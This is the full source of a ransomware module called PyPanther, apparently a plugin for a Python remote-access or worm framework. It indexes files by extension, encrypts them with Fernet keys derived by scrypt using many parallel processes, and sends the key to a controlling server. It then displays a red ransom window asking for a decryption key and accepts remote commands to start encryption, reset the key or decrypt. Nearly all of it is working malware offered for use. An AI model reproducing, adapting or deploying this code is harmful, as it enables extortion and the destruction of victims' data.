#!name##PyPanther
#!itemType##module
#!fileType##PY_MOD
#!info##A ransomware module written in Python. It encrypts files, sends the encryption key to the server, and displays a popup window informing about the infection with an input field for the decryption key; decryption can also be triggered remotely. Files are indexed using three filters: by file extensions, by ignoring specific substrings in directory names, and by checking whether a given string appears in the filename. Warning: use caution during testing, as you may encrypt your own files.
#!hiveType##PyExM
#!lang##python
#!pyType##module
#!reqMod##PyNiffler
#!Var##PAN_auto_start##True##Determines whether encryption starts automatically on launch or must be triggered remotely. Accepted values are "True" or "False".##str
#!Var##PAN_password##supersecretpassword##A string of characters (password) that will be used to generate the encryption key.##str
#!Var##PAN_salt_size##16##Size of salt attached to the password. Typical value: 8, 16, 32##str
#!Var##PAN_enc_ext##.encrypted##File extension of encrypted files.##str
#!Var##PAN_encrypt##fast##Encryption mode. "slow" - Files are encrypted sequentially, one by one. "fast" - Files are encrypted concurrently using multiple threads.
#!Var##PAN_th_num##20##Number of threads used for encryption when operating in "fast" mode.##str
#!Var##PAN_file_ext##jpg##File extensions to search for. Separate names with commas ",". Leaving this field empty will cause this criterion to be ignored by the filters.##str
#!Var##PAN_file_name##_NULL##Files are indexed based on the presence of specified words in their filenames. Separate names with commas ",". Leaving this field empty will cause this criterion to be ignored by the filters.##str
#!Var##PAN_ban_dir##_NULL##Directory names to ignore during scanning. Separate names with commas ",". Leaving this field empty will cause this criterion to be ignored by the filters.##str
#!Var##PAN_auto_start##True##Determines whether encryption starts automatically on launch or must be triggered remotely. Accepted values are "True" or "False".##str
#!Var##PAN_messages##If you want to recover your files contact: example@gmail.com##The message that will be displayed in the window when all files are encrypted.##str


{% if PAN_file_ext == "NO_VALUE" %}
    {% set PAN_FILE_EXT = [] %}
{% else %}
    {% set PAN_FILE_EXT = pyTOOL.buildListStr(PAN_file_ext, ",") %}
{% endif %}

{% if PAN_file_name == "NO_VALUE" %}
    {% set PAN_FILE_NAME = [] %}
{% else %}
    {% set PAN_FILE_NAME = pyTOOL.buildListStr(PAN_file_name, ",") %}
{% endif %}

{% if PAN_ban_dir == "NO_VALUE" %}
    {% set PAN_BAN_DIR = [] %}
{% else %}
    {% set PAN_BAN_DIR = pyTOOL.buildListStr(PAN_ban_dir, ",") %}
{% endif %}

{% if PAN_auto_start == "True" or PAN_auto_start == True %}
    {% set PAN_AUTO_START = True %}
{% else %}
    {% set PAN_AUTO_START = False %}
{% endif %}

{% if PAN_encrypt == "fast" %}
    {% set PAN_ENCRYPT = True %}
{% else %}
    {% set PAN_ENCRYPT = False %}
{% endif %}


import os
import base64
import tkinter
import threading
import string
import secrets
import pathlib
import random
import platform
import multiprocessing
from typing import Union
from time import sleep


import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

class PantherProcess(multiprocessing.Process):
    def __init__(self, key: bytes, file_path: str):
        super().__init__()
        self.PANTHER_KEY = key
        self.PANTHER_FILE_PATH = file_path
        self.ENCRYPTED_FILE_EXT = "{{PAN_enc_ext}}"
    
    def encryptFile(self) -> None:
        f = Fernet(self.PANTHER_KEY)
        try:
            with open(self.PANTHER_FILE_PATH, "rb") as file:
                data = file.read()
        except:
            return
        edata = f.encrypt(data)
        new_name = f"{self.PANTHER_FILE_PATH}{self.ENCRYPTED_FILE_EXT}"
        try:
            os.rename(self.PANTHER_FILE_PATH, new_name)
        except:
            return
        try:
            with open(new_name, "wb") as file:
                file.write(edata)
        except:
            os.rename(new_name, self.PANTHER_FILE_PATH)
    
    def run(self) -> None:
        self.encryptFile()


class PyPanther:
    MTYPES = "rat"
    STAND_TH = False
    def __init__(self, master_worm: object):
        self.worm = master_worm
        self.salt_size = {{PAN_salt_size}}
        self.password = "{{PAN_password}}"
        self.encrypted_file_ext = "{{PAN_enc_ext}}"
        self.fast_mode_th_no = {{PAN_th_num}}
        self.auto_start = {{PAN_AUTO_START}}
        self.fast_mode = {{PAN_ENCRYPT}}
        self.KEY = None
        self.slow_encrypt_pause = (3, 7)

        self.TARGET_FILE_EXT = {{PAN_FILE_EXT}}
        self.TARGET_FILE_NAME = {{PAN_FILE_NAME}}
        self.TARGET_BANNED_DIR = {{PAN_BAN_DIR}}

        self.CHECK_FILE_NAME = "{{randTOOL.genString(14)}}.txt"
        self.CHECK_FILE_PATH = self.buildCheckWorkPath()
        self.TEXT_ENCRYPTION = "{{PAN_messages}}"

        self.FLAG_decryption_working = False
        self.FLAG_encryption_working = False

        self.Niffler = self.buidNiffler()

    @property
    def TARGETS(self) -> list:
        return self.Niffler.Targets
    
    @property
    def scanWorkFlag(self) -> bool:
        return self.Niffler.WORKING_FLAG_FIND
    
    def buildCheckWorkPath(self) -> str:
        if platform.system().lower() == "linux":
            return os.path.join(pathlib.Path.home(), f".{self.CHECK_FILE_NAME}")
        else:
            return os.path.join(pathlib.Path.home(), self.CHECK_FILE_NAME)
    
    def makeCheckWorkFile(self) -> bool:
        try:
            with open(self.CHECK_FILE_PATH, "wb") as file:
                file.write(b"")
            return True
        except:
            return False
    
    def checkWorkFile(self) -> bool:
        if os.path.exists(self.CHECK_FILE_PATH):
            return True
        else:
            return False
    
    def deleteCheckFile(self) -> bool:
        try:
            os.remove(self.CHECK_FILE_PATH)
            return True
        except:
            return False
    
    ##### Screen ########

    def _checkDecKey(self, tk_wtxt: object, elabel: object) -> None:
        if self.FLAG_decryption_working:
            elabel.config(text="Decryption still working....")
            return
        dkey = tk_wtxt.get('1.0', 'end-1c')
        if len(dkey.strip(" ")) == 0:
            elabel.config(text="Wrong KEY !!!!!")
        else:
            elabel.config(text="Start decryption process.....")
            self.decryptFiles(dkey, elabel)

    def _buildWarnWindow(self) -> None:
        window = tkinter.Tk()
        window.geometry("800x500")
        window.title(self.worm.name)
        window.configure(bg="red")
        mlabel = tkinter.Label(window, text="!!! Your files have been encrypted !!!", font=("Arial", 26), fg="black", bg="red")
        mlabel.pack(pady=25)
        tlabel = tkinter.Label(window, text=self.TEXT_ENCRYPTION, font=("Arial", 16))
        tlabel.pack(pady=30)
        elabel = tkinter.Label(window, text="", bg="red", font=("Arial", 14), fg="black")
        elabel.pack(pady=60)
        dlabel = tkinter.Label(window, text="Decrypt Key", font=("Arial", 16))
        dlabel.pack(pady=10)
        wtxt = tkinter.Text(window, height=1, width=64, bg="white", fg="black")
        wtxt.pack(pady=5)
        dbutt = tkinter.Button(window, text="DECRYPT", command=lambda: self._checkDecKey(wtxt, elabel))
        dbutt.pack()
        window.mainloop()

    def buildWarnWindow(self) -> None:
        ww = threading.Thread(target=self._buildWarnWindow)
        ww.start()
    
    #########################################

    def buidNiffler(self) -> object:
        return PyNiffler(ban_dirs=self.TARGET_BANNED_DIR, target_file_ext=self.TARGET_FILE_EXT, target_file_name=self.TARGET_FILE_NAME)
    
    def buildDecryptNiffler(self) -> object:
        return PyNiffler(ban_dirs=self.TARGET_BANNED_DIR, target_file_ext=[self.encrypted_file_ext], target_file_name=self.TARGET_FILE_NAME)
    
    def checkEncryptionOs(self) -> bool:
        if self.checkWorkFile():
            return True
        self.makeCheckWorkFile()
    
    def generateKey(self) -> None:
        salt = secrets.token_bytes(self.salt_size)
        kdf = Scrypt(salt, length=32, n=2**14, r=8, p=1)
        kdf = kdf.derive(self.password.encode())
        self.KEY = base64.urlsafe_b64encode(kdf)
    
    def encryptFile(self, target: str) -> None:
        f = Fernet(self.KEY)
        try:
            with open(target, "rb") as file:
                data = file.read()
        except:
            return
        edata = f.encrypt(data)
        new_name = f"{target}{self.encrypted_file_ext}"
        try:
            os.rename(target, new_name)
        except:
            return
        try:
            with open(new_name, "wb") as file:
                file.write(edata)
        except:
            os.rename(new_name, target)
    
    def encryptFileProc(self, target: str) -> None:
        efp = PantherProcess(self.KEY, target)
        efp.start()
    
    def decryptFile(self, target: str) -> None:
        f = Fernet(self.KEY)
        try:
            with open(target, "rb") as file:
                edata = file.read()
            data = f.decrypt(edata)
            fname = target.rstrip(self.encrypted_file_ext)
            os.rename(target, fname)
            with open(fname, "wb") as file:
                file.write(data)
        except:
            pass
    
    def _sliceTargets(self) -> list:
        return [self.TARGETS[i::self.fast_mode_th_no] for i in range(self.fast_mode_th_no)]
    
    def _encryptFiles(self, targets: list) -> None:
        for t in targets:
            self.encryptFileProc(t)
    
    def fastEncryption(self) -> None:
        self.FLAG_encryption_working = True
        fTh = []
        for part in self._sliceTargets():
            th = threading.Thread(target=self._encryptFiles, args=(part, ))
            th.start()
            fTh.append(th)
        while True:
            for t in fTh:
                if t.is_alive():
                    continue
            break
        self.FLAG_encryption_working = False
        self.makeCheckWorkFile()
        self.buildWarnWindow()
    
    def slowEncryption(self) -> None:
        self.FLAG_encryption_working = True
        for tar in self.TARGETS:
            self._encryptFiles(tar)
            sleep(random.randint(self.slow_encrypt_pause[0], self.slow_encrypt_pause[1]))
        self.FLAG_encryption_working = False
        self.makeCheckWorkFile()
        self.buildWarnWindow()
    
    def sendKey(self) -> None:
        while not self.worm.is_conn:
            sleep(1)
        self.worm.send_msg(f"Ransomware KEY: {self.KEY}")
    
    def setNewKey(self, new_key: Union[str, bytes]) -> None:
        if self.FLAG_encryption_working:
            return
        if isinstance(new_key, str):
            try:
                new_key = new_key.encode()
            except:
                return
        self.KEY = new_key
        self.worm.send_msg("New KEY has been set.")
    
    def _decryptFiles(self, empty_label: object = None) -> None:
        if self.FLAG_decryption_working:
            return
        self.FLAG_decryption_working = True
        dNiffler = self.buildDecryptNiffler()
        dNiffler.start()
        while dNiffler.WORKING_FLAG_FIND:
            sleep(0.5)
        for df in dNiffler.Targets:
            self.decryptFile(df)
        self.FLAG_decryption_working = False
        self.deleteCheckFile()
        if empty_label:
            empty_label.config(text="DECRYPTION COMPLETE.")
    
    def decryptFiles(self, key: str, empty_label: object = None) -> None:
        self.setNewKey(key)
        dth = threading.Thread(target=self._decryptFiles, args=(empty_label, ))
        dth.start()
    
    def _exeEncryption(self) -> None:
        if self.scanWorkFlag or self.FLAG_decryption_working or self.FLAG_encryption_working:
            return
        if len(self.TARGETS) == 0:
            self.Niffler.start()
            self.worm.send_msg("File indeing started....")
            while self.scanWorkFlag:
                sleep(1)
            self.worm.send_msg(f"Scan complete. Indexing: {len(self.TARGETS)} files.")
        if not self.KEY:
            self.generateKey()
        self.sendKey()
        if self.fast_mode:
            self.fastEncryption()
        else:
            self.slowEncryption()
    
    def exeEncryption(self) -> None:
        eth = threading.Thread(target=self._exeEncryption)
        eth.start()
    
    def exeCmd(self, cmd: str, *args, **kwargs) -> None:
        com = cmd.split(" ")
        match com[0]:
            case "pan-key":
                self.sendKey()
            case "pan-set-key":
                self.setNewKey(com[1])
            case "pan-start":
                self.exeEncryption()
            case "pan-decrypt":
                self.decryptFiles(self.KEY)
            case "pan-reset":
                self.deleteCheckFile()
    
    def help(self) -> str:
        h = "'pan-key' - Show encryption key.\n"
        h += "'pan-set-key [key]' - Set KEY.\n"
        h += "'pan-start' - Start Encryption files.\n"
        h += "'pan-decrypt' - Start Decrypt files.\n"
        h += "'pan-reset' - Resets the check to see if the machine was encrypted.\n"
        return h
    
            
    def _startWorking(self) -> None:
        if self.scanWorkFlag:
            return
        self.Niffler.start()
        while self.scanWorkFlag:
            sleep(1)
        self.worm.send_msg(f"Scan complete. Indexing: {len(self.TARGETS)} files.")
        if self.auto_start:
            if not self.KEY:
                self.generateKey()
            self.sendKey()
            if self.fast_mode:
                self.fastEncryption()
            else:
                self.slowEncryption()

    def startWorking(self) -> None:
        sw = threading.Thread(target=self._startWorking)
        sw.start()
    
    def startEncryption(self) -> None:
        if self.checkEncryptionOs():
            self.worm.send_msg("System is encrypted.")
            self.buildWarnWindow()
            return
        self.generateKey()
        self.startWorking()
        
    def start(self) -> None:
        self.startEncryption()

    
